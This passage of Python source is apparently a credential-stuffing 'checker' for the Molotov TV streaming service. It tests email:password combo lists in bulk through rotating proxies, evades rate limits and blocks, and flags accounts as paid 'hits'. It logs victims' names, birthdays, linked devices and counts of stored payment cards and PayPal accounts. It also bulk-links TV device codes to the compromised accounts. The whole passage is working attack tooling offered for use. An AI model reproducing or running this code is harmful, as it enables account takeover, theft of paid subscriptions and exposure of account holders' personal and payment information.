                "paid_channels": bool(rights.get("has_paid_channels")),
                "max_devices": rights.get("max_devices", "N/A"),
                "simultaneous_streams": rights.get("video_simultaneous_streams", "N/A"),
                "can_download": bool(rights.get("can_download")),
                "has_download_feature": bool(rights.get("has_download_feature")),
                "can_record": bool(rights.get("can_smart_record")),
                "can_bookmark": bool(rights.get("can_bookmark")),
                "quota_seconds_max": rights.get("quota_in_seconds_max", 0),
                "device_count": 0,
                "payment_cards": 0,
                "payment_paypal": 0,
                "recurly": "N/A",
                "profile_count": len(profiles),
            }

            if CONFIG.get("fetch_devices", True):
                dev, err = await self.Eyelifter_get(DEVICES_URL, token)
                if not err and isinstance(dev, list):
                    u["device_count"] = len(dev)

            if CONFIG.get("fetch_payments", True):
                pay, err = await self.Eyelifter_get(PAYMENTS_URL, token)
                if not err and isinstance(pay, dict):
                    det = pay.get("details") or {}
                    cards = det.get("cards") or []
                    paypal = det.get("paypal_accounts") or []
                    rec = det.get("recurly_card") or {}
                    u["payment_cards"] = len(cards) if isinstance(cards, list) else 0
                    u["payment_paypal"] = len(paypal) if isinstance(paypal, list) else 0
                    if rec:
                        u["recurly"] = "YES"

            hit_reasons = []
            if u["paid_channels"]:
                hit_reasons.append("paid_channels")
            if u["can_record"]:
                hit_reasons.append("can_record")
            if u["can_bookmark"]:
                hit_reasons.append("can_bookmark")
            if u["can_download"]:
                hit_reasons.append("can_download")
            if u["recurly"] == "YES":
                hit_reasons.append("recurly")
            if u["payment_cards"] > 0:
                hit_reasons.append(f"cards={u['payment_cards']}")
            if u["payment_paypal"] > 0:
                hit_reasons.append(f"paypal={u['payment_paypal']}")

            u["hit_reasons"] = ",".join(hit_reasons) if hit_reasons else "N/A"

            if hit_reasons:
                return {"status": "hit", "user": u}
            return {"status": "free", "user": u}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")

    fields = [
        ("AccountID",  u.get("account_id") if u.get("account_id") != "N/A" else None),
        ("ProfileID",  u.get("profile_id") if u.get("profile_id") != "N/A" else None),
        ("Display",    u.get("display_name") if u.get("display_name") != "N/A" else None),
        ("SearchID",   u.get("search_id") if u.get("search_id") != "N/A" else None),
        ("Birthday",   u.get("birthday") if u.get("birthday") != "N/A" else None),
        ("PaidChan",   "YES" if u.get("paid_channels") else None),
        ("Bundles",    u.get("bundles") if u.get("bundles") != "N/A" else None),
        ("MaxDev",     str(u.get("max_devices")) if u.get("max_devices") not in (None, "N/A") else None),
        ("Streams",    str(u.get("simultaneous_streams")) if u.get("simultaneous_streams") not in (None, "N/A") else None),
        ("CanRec",     "YES" if u.get("can_record") else None),
        ("CanBook",    "YES" if u.get("can_bookmark") else None),
        ("CanDL",      "YES" if u.get("can_download") else None),
        ("Devices",    str(u.get("device_count")) if u.get("device_count") else None),
        ("Cards",      str(u.get("payment_cards")) if u.get("payment_cards") else None),
        ("PayPal",     str(u.get("payment_paypal")) if u.get("payment_paypal") else None),
        ("Recurly",    "YES" if u.get("recurly") == "YES" else None),
        ("Reason",     u.get("hit_reasons") if u.get("hit_reasons") != "N/A" else None),
    ]

    parts = []
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "-":
            continue
        parts.append(f"{label} = {value}")

    parts.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(parts)


def Eyelifter_tv_fmt_line(code, u, verdict):
    fields = [
        ("AccountID", u.get("account_id") if u.get("account_id") != "N/A" else None),
        ("ProfileID", u.get("profile_id") if u.get("profile_id") != "N/A" else None),
        ("Display",   u.get("display_name") if u.get("display_name") != "N/A" else None),
        ("SearchID",  u.get("search_id") if u.get("search_id") != "N/A" else None),
        ("Birthday",  u.get("birthday") if u.get("birthday") != "N/A" else None),
        ("PaidChan",  "YES" if u.get("paid_channels") else None),
        ("Bundles",   u.get("bundles") if u.get("bundles") != "N/A" else None),
        ("MaxDev",    str(u.get("max_devices")) if u.get("max_devices") not in (None, "N/A") else None),
        ("Streams",   str(u.get("simultaneous_streams")) if u.get("simultaneous_streams") not in (None, "N/A") else None),
        ("CanRec",    "YES" if u.get("can_record") else None),
        ("CanBook",   "YES" if u.get("can_bookmark") else None),
        ("CanDL",     "YES" if u.get("can_download") else None),
    ]
    parts = [f"code = {code}"]
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "-":
            continue
        parts.append(f"{label} = {value}")
    parts.append(f"by {AUTHOR_TAG}")
    return f"{verdict} {u.get('email', '?')}:{u.get('password', '?')} | " + " | ".join(parts)


def Eyelifter_parse_account(login_raw, email, password):
    acct = (login_raw.get("account") or {})
    rights = acct.get("rights") or {}
    profiles = acct.get("profiles") or []
    profile_id = profiles[0].get("id") if profiles else login_raw.get("profile_id")

    bundles = rights.get("tv_bundles_subscribed") or []
    if not isinstance(bundles, list):
        bundles = []

    return {
        "email": acct.get("email") or email,
        "password": password,
        "account_id": str(acct.get("id") or "N/A"),
        "profile_id": str(profile_id or "N/A"),
        "search_id": acct.get("search_id") or "N/A",
        "display_name": acct.get("display_name") or "N/A",
        "first_name": acct.get("first_name") or "",
        "last_name": acct.get("last_name") or "",
        "gender": acct.get("gender") or "N/A",
        "birthday": Eyelifter_ts_to_date(acct.get("birthday")),
        "has_password": bool(acct.get("has_password")),
        "is_prospect": bool(acct.get("is_prospect")),
        "bundles": ",".join(str(b) for b in bundles) if bundles else "N/A",
        "bundle_count": len(bundles),
        "paid_channels": bool(rights.get("has_paid_channels")),
        "max_devices": rights.get("max_devices", "N/A"),
        "simultaneous_streams": rights.get("video_simultaneous_streams", "N/A"),
        "can_download": bool(rights.get("can_download")),
        "has_download_feature": bool(rights.get("has_download_feature")),
        "can_record": bool(rights.get("can_smart_record")),
        "can_bookmark": bool(rights.get("can_bookmark")),
        "quota_seconds_max": rights.get("quota_in_seconds_max", 0),
        "profile_count": len(profiles),
    }


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith(("login_net_", "get_net_")):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            Eyelifter_out(f"[{done}/{total}] {full}", color="32", bold=True)
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo}\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    Eyelifter_out(f"[RECORD-FAIL] {combo[:30]}: {e}")

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "✅ PAID" if result["status"] == "hit" else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("Account ID", u.get("account_id", "-")),
            ("Profile ID", u.get("profile_id", "-")),
            ("Search ID", u.get("search_id", "-")),
            ("Display Name", u.get("display_name", "-")),
            ("First Name", u.get("first_name", "-") or "-"),
            ("Last Name", u.get("last_name", "-") or "-"),
            ("Gender", u.get("gender", "-")),
            ("Birthday", u.get("birthday", "-")),
            ("Has Password", "Yes" if u.get("has_password") else "No"),
            ("Is Prospect", "Yes" if u.get("is_prospect") else "No"),    
            ("Paid Channels", "Yes" if u.get("paid_channels") else "No"),
            ("Bundles", u.get("bundles", "-")),
            ("Max Devices", str(u.get("max_devices", "-"))),
            ("Simultaneous Streams", str(u.get("simultaneous_streams", "-"))),
            ("Can Download", "Yes" if u.get("can_download") else "No"),
            ("Can Record", "Yes" if u.get("can_record") else "No"),
            ("Can Bookmark", "Yes" if u.get("can_bookmark") else "No"),
            ("Quota Seconds Max", str(u.get("quota_seconds_max", 0))),
            ("Linked Devices", str(u.get("device_count", 0))),
            ("Card Methods", str(u.get("payment_cards", 0))),
            ("PayPal Methods", str(u.get("payment_paypal", 0))),
            ("Recurly", u.get("recurly", "-")),
            ("Profiles", str(u.get("profile_count", 0))),
            ("Hit Reason", u.get("hit_reasons", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies
    global _eyelifter_progress_thread

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "molotov_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "molotov_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "molotov_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "molotov_errors.txt"), "w", encoding="utf-8")

    header = (f"# Molotov TV Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad_proxies = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    _eyelifter_progress_stop.clear()
    _eyelifter_progress_thread[0] = threading.Thread(
        target=Eyelifter_progress_loop, daemon=True
    )
    _eyelifter_progress_thread[0].start()

    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        _eyelifter_progress_stop.set()
        if _eyelifter_progress_thread[0]:
            _eyelifter_progress_thread[0].join(timeout=1.5)
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("molotov_hits.txt", "hits"),
        ("molotov_free.txt", "free"),
        ("molotov_bad.txt", "bad"),
        ("molotov_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")
    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (paid)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_tv_login(proxies):
    Eyelifter_verify("tv_login")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("TV LOGIN")

    print(Eyelifter_color("2", "  Open molotov.tv/link on your phone or TV and enter"))
    print(Eyelifter_color("2", "  the 4-char code shown on the TV screen."))
    print()

    code = input(f"{Eyelifter_color('96', '[*] TV code (4 chars): ')}").strip().upper()
    if not CODE_RE.match(code):
        Eyelifter_log("❌", "ERROR", "INPUT", "code must be 4 alphanumeric chars")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    combo = input(f"{Eyelifter_color('96', '[*] Account combo (email:password): ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "combo must be email:password")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    start = time.time()
    Eyelifter_log("🔍", "STEP", "PRE", f"polling code {code} before login...")
    pre_status, pre_body = Eyelifter_code_status_sync(code, proxy=proxy)
    Eyelifter_dump_raw(f"pre-status  HTTP {pre_status}", pre_body, 30)

    Eyelifter_log("🔐", "STEP", "LOGIN", f"signing in as {email}...")
    session, err, raw_login = Eyelifter_login_sync(email, password, proxy=proxy)

    if err == "bad_creds":
        Eyelifter_dump_raw("login response  HTTP 400/401", raw_login, 60)
        print()
        print(Eyelifter_color("31", "  ❌ INVALID — credentials rejected", True))
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if err:
        Eyelifter_dump_raw("login response", raw_login, 60)
        print()
        print(Eyelifter_color("31", f"  ❌ LOGIN ERROR — {err}", True))
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_dump_raw("login response  HTTP 200", raw_login, 60)
    print()
    print(Eyelifter_color("32", "  ✓ login OK", True))

    token = session["token"]
    u = Eyelifter_parse_account(session["raw"], email, password)
    try:
        session["session"].close()
    except Exception:
        pass

    Eyelifter_log("📡", "STEP", "LINK", f"activating code {code}...")
    act = Eyelifter_activate_code_sync(token, code, proxy=proxy)

    Eyelifter_dump_raw(f"activate response  HTTP {act['http']}", act["body"], 80)

    post_status, post_body = Eyelifter_code_status_sync(code, token=token, proxy=proxy)
    Eyelifter_dump_raw(f"post-status  HTTP {post_status}", post_body, 40)

    elapsed = time.time() - start

    if act["status"] == "valid":
        print(Eyelifter_color("32", "  ✅ VALID — device linked successfully", True))
        verdict = "VALID"
    elif act["status"] == "invalid":
        print(Eyelifter_color("31", "  ❌ INVALID — code rejected", True))
        verdict = "INVALID"
    elif act["status"] == "not_authed":
        print(Eyelifter_color("31", "  ❌ INVALID — not authorized", True))
        verdict = "NOT_AUTHED"
    elif act["status"] == "rate_limit":
        print(Eyelifter_color("33", "  ⚠️ RATE LIMITED", True))
        verdict = "RATE_LIMIT"
    else:
        print(Eyelifter_color("33", f"  ⚠️ {act['status'].upper()}", True))
        verdict = act["status"].upper()

    rows = [
        ("Verdict", verdict),
        ("Code", code),
        ("Email", email),
        ("Password", password),
        ("Account ID", u.get("account_id", "-")),
        ("Profile ID", u.get("profile_id", "-")),
        ("Search ID", u.get("search_id", "-")),
        ("Display Name", u.get("display_name", "-")),
        ("First Name", u.get("first_name", "-") or "-"),
        ("Last Name", u.get("last_name", "-") or "-"),
        ("Birthday", u.get("birthday", "-")),
        ("Paid Channels", "Yes" if u.get("paid_channels") else "No"),
        ("Plan", u.get("bundles", "-")),
        ("Bundle Count", str(u.get("bundle_count", 0))),
        ("Max Devices", str(u.get("max_devices", "-"))),
        ("Simultaneous Streams", str(u.get("simultaneous_streams", "-"))),
        ("Can Download", "Yes" if u.get("can_download") else "No"),
        ("Can Record", "Yes" if u.get("can_record") else "No"),
        ("Can Bookmark", "Yes" if u.get("can_bookmark") else "No"),
        ("Quota Seconds Max", str(u.get("quota_seconds_max", 0))),
        ("Profiles", str(u.get("profile_count", 0))),
        ("Activate HTTP", str(act["http"])),
        ("Pre-Status", str(pre_status)),
        ("Post-Status", str(post_status)),
        ("Time", f"{elapsed:.2f}s"),
        ("Checked By", AUTHOR_TAG),
    ]
    Eyelifter_summary(rows)

    if verdict == "VALID":
        os.makedirs(RESULTS_FOLDER, exist_ok=True)
        fname = os.path.join(RESULTS_FOLDER, "tv_login_hits.txt")
        try:
            with open(fname, "a", encoding="utf-8") as f:
                f.write(Eyelifter_tv_fmt_line(code, u, verdict) + "\n")
            Eyelifter_log("💾", "INFO", "SAVE", f"appended → {fname}")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "SAVE", str(e))

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_tv_login(proxies):
    Eyelifter_verify("bulk_tv_login")
    Eyelifter_section("BULK TV LOGIN")
    print(Eyelifter_color("2", "  File format: one entry per line."))
    print(Eyelifter_color("2", "    CODE:email:password"))
    print(Eyelifter_color("2", "    code,email,password"))
    print(Eyelifter_color("2", "    CODE email password"))
    print()

    path = input(f"{Eyelifter_color('96', '[*] File path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    entries = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            parts = re.split(r'[:\s,]+', line)
            parts = [p.strip() for p in parts if p.strip()]
            if len(parts) < 3:
                continue
            code = parts[0].upper()
            email = parts[1]
            password = parts[2]
            if CODE_RE.match(code) and "@" in email:
                entries.append((code, email, password))

    if not entries:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid entries")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(entries)} entries")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    folder = os.path.join(RESULTS_FOLDER, f"BulkTV_{ts}_{rand_tag}")
    os.makedirs(folder, exist_ok=True)

    valid_f   = open(os.path.join(folder, "valid.txt"),   "w", encoding="utf-8")
    invalid_f = open(os.path.join(folder, "invalid.txt"), "w", encoding="utf-8")
    error_f   = open(os.path.join(folder, "errors.txt"),  "w", encoding="utf-8")

    header = (f"# Molotov TV Linker Bulk - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n# Seal: {CREDIT_SEAL}\n\n")
    for fh in (valid_f, invalid_f, error_f):
        fh.write(header)

    stats = {"valid": 0, "invalid": 0, "error": 0, "rate_limit": 0}

    pbar = None
    try:
        pbar = tqdm(total=len(entries), desc="linking", unit="link", ncols=80)
    except Exception:
        pbar = None

    for code, email, password in entries:
        pre_http, pre_body = Eyelifter_code_status_sync(code)
        session, err, raw_login = Eyelifter_login_sync(email, password)

        if err == "bad_creds":
            stats["invalid"] += 1
            invalid_f.write(f"{code}:{email}:{password} | bad_creds\n")
            if pbar:
                pbar.update(1)
            continue

        if err:
            stats["error"] += 1
            error_f.write(f"{code}:{email}:{password} | {err}\n")
            if pbar:
                pbar.update(1)
            continue

        token = session["token"]
        u = Eyelifter_parse_account(session["raw"], email, password)
        try:
            session["session"].close()
        except Exception:
            pass

        act = Eyelifter_activate_code_sync(token, code)
        post_status, post_body = Eyelifter_code_status_sync(code, token=token)

        if act["status"] == "valid":
            stats["valid"] += 1
            line = Eyelifter_tv_fmt_line(code, u, "VALID")
            print(Eyelifter_color("32", line, True))
            valid_f.write(line + "\n")
        elif act["status"] == "invalid":
            stats["invalid"] += 1
            invalid_f.write(f"{code}:{email}:{password} | http_{act['http']}\n")
        elif act["status"] == "rate_limit":
            stats["rate_limit"] += 1
            error_f.write(f"{code}:{email}:{password} | rate_limit\n")
        else:
            stats["error"] += 1
            error_f.write(f"{code}:{email}:{password} | {act['status']} | "
                          f"{act['body'][:120]}\n")

        for fh in (valid_f, invalid_f, error_f):
            fh.flush()

        if pbar:
            pbar.update(1)
        time.sleep(CONFIG.get("bulk_tv_delay", 0.4))

    if pbar:
        pbar.close()

    for fh in (valid_f, invalid_f, error_f):
        try:
            fh.close()
        except Exception:
            pass

    for base, key in (("valid.txt", "valid"),
                      ("invalid.txt", "invalid"),
                      ("errors.txt", "error")):
        old = os.path.join(folder, base)
        new = os.path.join(folder, base.replace(".txt", f"_{stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {folder}")
    Eyelifter_divider()
    Eyelifter_summary([
        ("Total", len(entries)),
        ("Valid", stats["valid"]),
        ("Invalid", stats["invalid"]),
        ("Rate Limited", stats["rate_limit"]),
        ("Errors", stats["error"]),
        ("Folder", folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_gen_single():
    Eyelifter_verify("gen_single")
    Eyelifter_section("GENERATE ONE CODE")
    start = time.time()
    result, err, raw = Eyelifter_generate_code_sync()
    elapsed = time.time() - start

    Eyelifter_dump_raw("generate response", raw, 40)
    print()

    if result:
        print(Eyelifter_color("32", "  ✅ code generated", True))
        Eyelifter_summary([
            ("Code", result["code"]),
            ("TTL", f"{result['ttl']}s"),
            ("Check Freq", f"{result['freq']}s"),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ])
    else:
        print(Eyelifter_color("31", f"  ❌ FAILED — {err}", True))
        Eyelifter_summary([
            ("Error", err or "unknown"),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_gen_bulk():
    Eyelifter_verify("gen_bulk")
    Eyelifter_section("BULK GENERATE CODES")
    try:
        count = int(input(f"{Eyelifter_color('96', '[*] How many codes: ')}").strip())
    except Exception:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid count")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return
    count = max(1, min(CONFIG.get("code_gen_max", 10000), count))

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    folder = os.path.join(RESULTS_FOLDER, f"Gen_{ts}_{rand_tag}")
    os.makedirs(folder, exist_ok=True)

    fname = os.path.join(folder, "codes.txt")
    fh = open(fname, "w", encoding="utf-8")
    fh.write(f"# Molotov TV codes - {datetime.now().isoformat()}\n"
             f"# Generated by {AUTHOR_TAG}\n# Seal: {CREDIT_SEAL}\n\n")

    Eyelifter_log("📊", "INFO", "GEN", f"target {count} codes")

    pbar = None
    try:
        pbar = tqdm(total=count, desc="generating", unit="code", ncols=80)
    except Exception:
        pbar = None

    made = 0
    fails = 0
    rl = 0
    while made < count:
        result, err, _ = Eyelifter_generate_code_sync()

        if result:
            made += 1
            fh.write(result["code"] + "\n")
            fh.flush()
            print(Eyelifter_color("32", f"  [{made}/{count}] {result['code']}  ttl={result['ttl']}s"))
            if pbar:
                pbar.update(1)
            time.sleep(CONFIG.get("code_gen_delay", 0.5))
        else:
            fails += 1
            if err == "rate_limit":
                rl += 1
                time.sleep(CONFIG.get("code_gen_retry_delay", 2.0))
            elif err == "block":
                time.sleep(CONFIG.get("code_gen_block_delay", 1.0))
            else:
                time.sleep(0.5)

    if pbar:
        pbar.close()

    try:
